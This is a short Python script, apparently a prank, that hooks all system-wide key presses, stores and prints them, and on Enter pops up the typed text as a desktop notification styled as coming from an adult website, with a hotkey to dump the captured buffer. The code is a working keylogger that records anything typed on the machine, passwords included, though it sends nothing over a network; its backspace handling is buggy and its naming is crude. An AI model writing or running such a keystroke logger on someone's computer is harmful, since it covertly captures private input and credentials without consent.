import keyboard
from plyer import notification
from time import sleep as s

def Message(message):
    # message = input("Message > ")
    sender = "Felix"
    notification.notify(title= (f"From {sender}"),
                        message= message,
                        app_name="Pornhub",
                        app_icon = None,
                        timeout= 2)

index = 0
message = []


def filter(char):
    global index
    global message
    if char == "space":
        index +=1
        return " "
    elif char == "skift":
        return ""
    elif char == "backspace":
        message.pop(index+1)
        index-=1
        print(index, "".join(message))
        return ""
    elif char == "enter":
        Message("".join(message))
        return ""
    elif len(char) > 1:
        index +=1
        return "[%s]" % char
    else:
        index +=1

        return char

def logger(event):
    anus = (filter(event.name))
    message.append(anus)
    return print(anus)

def yes():
    print("".join(message))

keyboard.on_press(logger)

keyboard.add_hotkey('ctrl+shift+ä', yes)
keyboard.wait()



#taskkill /IM pythonw.exe /F